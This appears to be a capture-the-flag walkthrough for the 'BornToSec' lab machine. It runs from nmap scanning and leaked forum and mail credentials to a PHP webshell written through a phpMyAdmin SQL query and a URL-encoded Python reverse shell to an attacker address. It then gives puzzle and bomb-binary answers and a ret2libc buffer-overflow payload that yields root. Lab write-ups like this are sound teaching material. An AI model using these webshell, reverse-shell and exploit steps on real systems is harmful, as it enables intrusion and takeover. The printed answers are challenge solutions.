# Information Gathering
We have no info about the machine we can begin finding the IP of the machine and some open ports

nmap -sn 172.20.10.0/24
Nmap scan report for 172.20.10.2
Host is up (0.00025s latency).

We will make an agressive test on the IP to check open ports and some exploit opportunity

21/tcp  open  ftp        vsftpd 2.0.8 or later
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 07:bf:02:20:f0:8a:c8:48:1e:fc:41:ae:a4:46:fa:25 (DSA)
|   2048 26:dd:80:a3:df:c4:4b:53:1e:53:42:46:ef:6e:30:b2 (RSA)
|_  256 cf:c3:8c:31:d7:47:7c:84:e2:d2:16:31:b2:8e:63:a7 (ECDSA)
80/tcp  open  http       Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Hack me if you can
143/tcp open  imap       Dovecot imapd
|_ssl-date: 2024-08-23T12:41:41+00:00; 0s from scanner time.
|_imap-capabilities: ENABLE Pre-login LOGIN-REFERRALS ID more post-login have listed IMAP4rev1 LITERAL+ SASL-IR capabilities STARTTLS LOGINDISABLEDA0001 OK IDLE
443/tcp open  ssl/http   Apache httpd 2.2.22
|_ssl-date: 2024-08-23T12:41:41+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=BornToSec
| Not valid before: 2015-10-08T00:19:46
|_Not valid after:  2025-10-05T00:19:46
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: 404 Not Found
993/tcp open  ssl/imaps?
|_ssl-date: 2024-08-23T12:41:41+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2015-10-08T20:57:30
|_Not valid after:  2025-10-07T20:57:30
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

We can see a lot of interesting services running on the machine first of all a website
When we try to reach the page we have "Not found" first reflex we have to find the right route for this I will use dirbub enumerate the routes
We have some interesting results we can see that we have a forum, a squirrelmail service and a phpmyadmin

With wappalyzer extension we can see that squirrel mail version is 1.4.22

We have a lot of users
admin
lmezard
qudevide
thor
wandre
zaz

we found a password for lmezard on a post : !q\]Ej?*5K5cy*AJ
With this password we can connect on forum.

we found it's mail laurie@borntosec.net we can now connect to squirrelmail

In squirrelmail we have a db root password root/Fg-'kKXBj87E:aJ$

This access gives us something interesting squirrel 1.4.22 is vulnerable to a remote code execution it means that we can have a shell or we can inject a shell in
phpmyadmin

We must find a file where we can upload our shell here it is : templates_c found on the documentation.
https://github.com/My-Little-Forum/mylittleforum/wiki/Installation

I will choose the second option :
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/backdoor.php"

you have to url encode the reverse shell and put it in the url ip/forum/templates_c/backdoor.php?cmd=exploit
python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22172.20.10.3%22%2C9001%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22sh%22%29%27%0A%0A

in /home/LOOKATME we have lmezard password : G!@M6f4Eatau{sF"

# lmezard

we have a file in lmezard home named fun if we make strings fun we can see with some greps that the password is : getme1() + getme2() + ... + getme12() functions

	printf("%c",getme1());
	printf("%c",getme2());
	printf("%c",getme3());
	printf("%c",getme4());
	printf("%c",getme5());
	printf("%c",getme6());
	printf("%c",getme7());
	printf("%c",getme8());
	printf("%c",getme9());
	printf("%c",getme10());
	printf("%c",getme11());
	printf("%c",getme12());
	printf("\n");
	printf("Now SHA-256 it and submit");

I made a python script to parse files .pcap but only ascii text
The format of files is /file followed by number and then the content I put it in C files and then compile

Iheartpwnage in SHA256 = 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

laurie password = 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

# Bomb binary laurie

Now we have bomb binary decompiling it we can try to defuse :

First input : Public speaking is very easy.

Each subsequent number must follow the pattern defined in the loop:
    v4[i]=v4[i-1]×(i+1)
    v4[0] = 1
	v4[1]= v4[0]× 2 = 2
    v4[2]= v4[1]× 3 = 2 × 3 = 6
    v4[3]= v4[2]× 4 = 6 × 4 = 24
    v4[4]= v4[3]× 5 = 24 × 5 = 120
    v4[5]= v4[4]× 6 = 120 × 6 = 720

Second input : 1 2 6 24 120 720

Third input : 7 b 524

Fourth input : 9


Fifth :

.data:0804B220 array_123       db 69h  ; i
.data:0804B221                 db  73h ; s
.data:0804B222                 db  72h ; r
.data:0804B223                 db  76h ; v
.data:0804B224                 db  65h ; e
.data:0804B225                 db  61h ; a
.data:0804B226                 db  77h ; w
.data:0804B227                 db  68h ; h
.data:0804B228                 db  6Fh ; o
.data:0804B229                 db  62h ; b
.data:0804B22A                 db  70h ; p
.data:0804B22B                 db  6Eh ; n
.data:0804B22C                 db  75h ; u
.data:0804B22D                 db  74h ; t
.data:0804B22E                 db  66h ; f
.data:0804B22F                 db  67h ; g

We have to build the string giants with the letters in array_123 so we need to have index & 15

array_123[15] + array_123[0] + array_123[5] + array_123[11] + array_123[13] + array_123[1]

index = index & 15

Fifth input : o0ukmA (one of the possibility more in the script)
# if we only take ascii lowercase uppercase and digits
g: ['o', 'O']
i: ['p', 'P', '0']
a: ['e', 'u', 'E', 'U', '5']
n: ['k', 'K']
t: ['m', 'M']
s: ['a', 'q', 'A', 'Q', '1']

Sixth :
node1 = 253
node2 = 725
node3 = 301
node4 = 997
node5 = 212
node6 = 432
We have to sort the node in descending order doing permutations in the input (input < 6)

Sixth input : 4 2 6 3 1 5

with the different possibilites we had to bruteforce to find the password with string.ascii_lowercase

Thor password : Publicspeakingisveryeasy.126241207201b2149opekmq426135

# Thor

For thor we have a turtle file with instruction we will resolve it with python script it's writing the word SLASH

https://www.browserling.com/tools/all-hashes
and we have to hash it as said at the end of the file and in MD5 it gives us : 646da671ca01bb5d84dbb5fb2238dc8e


Zaz password : 646da671ca01bb5d84dbb5fb2238dc8e

# Zaz

In this binary when decompiled we direcly see the buffer overflow we'll do a ret2libc to gain a shell

p system : 0xb7e6b060
find 0xb7e2c000,0xb7fcf000,"/bin/sh" : 0xb7f8cc58
p exit : 0xb7e5ebe0

Offset 140 calculated with [pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) => print("A" * 140) + struct.pack("I", 0xb7e6b060) + struct.pack("I", 0xb7e5ebe0) + struct.pack("I", 0xb7f8cc58)

We have a root shell
